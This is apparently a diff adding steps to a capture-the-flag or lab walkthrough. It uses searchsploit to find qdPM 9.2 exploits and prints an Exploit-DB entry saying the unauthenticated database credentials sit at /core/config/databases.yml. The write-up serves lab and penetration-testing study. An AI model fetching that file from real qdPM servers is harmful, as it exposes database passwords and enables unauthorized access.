@@ -30,3 +30,38 @@ Open broswer:
 
 Search vuln for qdpm92:
 
+```shell
+└─$ searchsploit qdpm 9.2          
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+qdPM 9.2 - Cross-site Request Forgery (CSRF)                                                                                                                                                              | php/webapps/50854.txt
+qdPM 9.2 - Password Exposure (Unauthenticated)                                                                                                                                                            | php/webapps/50176.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                                                                                                                                            
+└─$ 
+```
+
+```shell
+└─$ searchsploit -p php/webapps/50176.txt
+  Exploit: qdPM 9.2 - Password Exposure (Unauthenticated)
+      URL: https://www.exploit-db.com/exploits/50176
+     Path: /usr/share/exploitdb/exploits/php/webapps/50176.txt
+File Type: ASCII text
+```
+                                                                                                                                                                                                                                            
+```shell
+└─$ cat /usr/share/exploitdb/exploits/php/webapps/50176.txt
+# Exploit Title: qdPM 9.2 - DB Connection String and Password Exposure (Unauthenticated)
+# Date: 03/08/2021
+# Exploit Author: Leon Trappett (thepcn3rd)
+# Vendor Homepage: https://qdpm.net/
+# Software Link: https://sourceforge.net/projects/qdpm/files/latest/download
+# Version: 9.2
+# Tested on: Ubuntu 20.04 Apache2 Server running PHP 7.4
+
+The password and connection string for the database are stored in a yml file. To access the yml file you can go to http://<website>/core/config/databases.yml file and download.                                                                                                                                                                                                                                            
+└─$ 
+
+```
